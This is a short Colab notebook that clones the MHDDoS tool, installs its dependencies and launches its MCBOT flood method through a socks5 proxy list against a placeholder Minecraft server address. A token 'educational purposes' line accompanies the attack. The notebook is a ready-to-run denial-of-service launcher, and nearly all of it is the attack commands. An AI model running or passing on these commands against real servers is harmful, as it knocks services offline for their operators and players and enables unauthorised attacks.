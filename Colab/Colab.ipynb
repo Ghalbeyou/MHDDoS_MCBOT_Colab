{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a href=\"https://colab.research.google.com/github/Ghalbeyou/MHDDoS_MCBOT_Colab/blob/main/Colab/Colab.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>\n",
    "\n",
    "**Installing**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "!git clone https://github.com/MatrixTM/MHDDoS.git\n",
    "!pip install -r MHDDoS/requirements.txt"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**DDoSing a mcserver (only do it on edc purposes)**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "!python3 MHDDoS/start.py MCBOT <IP:PORT> 5 100 socks5.txt 100 100"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Colab by https://github.com/ghalbeyou**"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.10.4 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "name": "python",
   "version": "3.10.4"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "8e355a8d2e1758a5995637ddcd93977eea11d6ad009cc608b6a46a491ee8dd1e"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
